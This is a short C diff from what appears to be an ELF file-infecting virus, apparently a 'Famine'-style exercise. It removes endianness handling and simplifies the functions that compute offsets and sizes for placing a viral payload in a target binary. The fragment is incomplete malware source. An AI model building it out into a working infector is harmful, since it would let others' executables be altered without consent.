@@ -67,16 +67,15 @@ static void	generate_key(char *buffer, size_t len)
 }
 
 static void	init_constants(struct client_info *constants, \
-			const struct entry *original_entry, \
-			const struct endians_pointer endians)
+			const struct entry *original_entry)
 {
 	ft_memcpy(constants->key, SECRET_SIGNATURE, SECRET_LEN);
 	generate_key((char *)constants->key + SECRET_LEN, 16 - SECRET_LEN);
 
 	const size_t		end_of_last_section = original_entry->end_of_last_section;
-	const Elf64_Off		p_offset  = endians.endian_8(original_entry->safe_phdr->p_offset);
-	const Elf64_Xword	p_memsz   = endians.endian_8(original_entry->safe_phdr->p_memsz);
-	const Elf64_Off		sh_offset = endians.endian_8(original_entry->safe_shdr->sh_offset);
+	const Elf64_Off		p_offset  = (original_entry->safe_phdr->p_offset);
+	const Elf64_Xword	p_memsz   = (original_entry->safe_phdr->p_memsz);
+	const Elf64_Off		sh_offset = (original_entry->safe_shdr->sh_offset);
 	const size_t		rel_text  = end_of_last_section - sh_offset;
 
 	constants->relative_pt_load_address = end_of_last_section - p_offset;
@@ -86,13 +85,11 @@ static void	init_constants(struct client_info *constants, \
 	constants->virus_size               = (uint64_t)_start - (uint64_t)virus;
 }
 
-bool		setup_payload(const struct entry *original_entry, \
-			const struct endians_pointer endians, \
-			const struct safe_pointer info)
+bool		setup_payload(const struct entry *original_entry, const struct safe_pointer info)
 {
 	struct client_info	constants;
 
-	init_constants(&constants, original_entry, endians);
+	init_constants(&constants, original_entry);
 
 	const size_t	payload_size = (uint64_t)_start - (uint64_t)famine_entry;
 	const size_t	virus_size   = constants.virus_size;
